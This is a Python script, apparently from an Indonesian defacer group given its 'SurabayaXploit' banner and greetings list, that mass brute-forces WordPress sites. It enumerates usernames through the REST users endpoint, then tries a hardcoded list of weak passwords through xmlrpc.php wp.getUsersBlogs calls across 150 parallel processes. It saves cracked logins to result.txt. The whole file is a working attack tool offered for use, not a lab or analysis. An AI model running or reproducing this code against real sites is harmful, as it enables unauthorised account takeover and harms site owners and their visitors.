import requests
import re
from colorama import Fore
from multiprocessing import Pool

# Fungsi untuk memeriksa apakah URL valid
def is_valid_url(url):
    return re.match(r'^https?://(?:www\.)?[\w-]+\.[\w.-]+(?:$|/)', url)

# Fungsi untuk mengambil daftar username dari API WordPress
def get_usernames(url):
    try:
        if not is_valid_url(url):
            print(Fore.RED + 'URL tidak valid :', url)
            return []

        users_url = url.rstrip('/') + '/wp-json/wp/v2/users'
        response = requests.get(users_url, timeout=25)

        if response.status_code == 200:
            users = response.json()
            usernames = []
            for user in users:
                for key in ['slug', 'name', 'username', 'author']:
                    if key in user:
                        usernames.append(user[key])
                        break
                else:
                    print(Fore.YELLOW + 'Tidak dapat menemukan username :', user)
            return usernames
        else:
            print(Fore.RED + 'Gagal mengambil daftar pengguna dari :', url)
            return []
    except requests.exceptions.RequestException as e:
        print(Fore.RED + 'Error saat mengambil daftar pengguna dari :', url)
        return []

# Fungsi untuk melakukan bruteforce login
def bruteforce(url):
    try:
        if not is_valid_url(url):
            print(Fore.RED + 'URL tidak valid :', url)
            return False

        usernames = get_usernames(url)
        
        if not usernames:
            usernames = ['admin']  # Jika tidak ada username yang ditemukan, coba dengan username default 'admin'

        for username in usernames:
            Signs = ['Archive', 'Archives', 'Author', 'Home', ',', ';', '\\']
            if any(Sign in username for Sign in Signs):
                continue
                
            if username.lower() == 'admin':
                for password in ['admin', 'pass', 'user', 'administrator', 'demo', 'test', 'qwerty', 'root','Admin@123', 'admin@123', 'admin123', 'Admin', 'Admin11@', 'admin@123#', 'adminPass', 'Admin@123#', 'Password@123', 'admin2024', 'admin@2024','admin1234','admin2023','admin2025']:
                    xml_payload = """
                    <methodCall>
                        <methodName>wp.getUsersBlogs</methodName>
                        <params>
                            <param><value>{}</value></param>
                            <param><value>{}</value></param>
                        </params>
                    </methodCall>
                    """.format(username, password)

                    response = requests.post(url + '/xmlrpc.php', data=xml_payload, timeout=15)

                    if 'blogName' in response.text:
                        print(Fore.GREEN + '[Successful] : {} Username: {} Password: {}'.format(url, username, password))
                        with open("result.txt", "a") as result_file:
                            result_file.write(f"{url}/wp-login.php#{username}@{password}\n")
                        return True
                    else:
                        print(Fore.RED + '[Failed] : {} Username: {} Password: {}'.format(url, username, password))
            else:
                for password in [username]:
                    xml_payload = """
                    <methodCall>
                        <methodName>wp.getUsersBlogs</methodName>
                        <params>
                            <param><value>{}</value></param>
                            <param><value>{}</value></param>
                        </params>
                    </methodCall>
                    """.format(username, password)

                    response = requests.post(url + '/xmlrpc.php', data=xml_payload, timeout=15)

                    if 'blogName' in response.text:
                        print(Fore.GREEN + '[Successful] : {} Username: {} Password: {}'.format(url, username, password))
                        with open("result.txt", "a") as result_file:
                            result_file.write(f"{url}/wp-login.php#{username}@{password}\n")
                        return True
                    else:
                        print(Fore.RED + '[Failed] : {} Username: {} Password: {}'.format(url, username, password))

    except requests.exceptions.RequestException as e:
        print(Fore.RED + 'Error saat melakukan permintaan ke', url)
    except Exception as e:
        print(Fore.RED + 'Error lainnya')
    return False

# Baca daftar URL dari file
def read_url_list(filename):
    try:
        with open(filename, 'r') as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + 'File tidak ditemukan :', filename)
        return []

def main(url):
    # Gunakan daftar kata sandi yang telah tersedia
    bruteforce(url)

if __name__ == "__main__":
    print("coded by : Nusantara1945/. - SurabayaXploit")
    print("Greezt :' - 'Yallisme' - 'Throne404/.' - 'TegalXploiter'- 'Rysnanto' - 'ArjunDewangga' - 'Wardijen")
    filename = input("Masukkan List (.txt) : ")
    urls = read_url_list(filename)

    if not urls:
        print(Fore.RED + 'Tidak ada URL yang valid dalam file.')
    else:
        # Gunakan daftar kata sandi yang telah tersedia
        passwords = ['admin', 'pass', 'user', 'administrator', 'demo', 'test', 'qwerty', 'root','Admin@123', 'admin@123', 'admin123', 'Admin', 'Admin11@', 'admin@123#', 'adminPass', 'Admin@123#', 'Password@123', 'admin2024', 'admin@2024']
        
        # Gunakan multiprocessing
        with Pool(150) as mp:
            mp.map(main, urls)
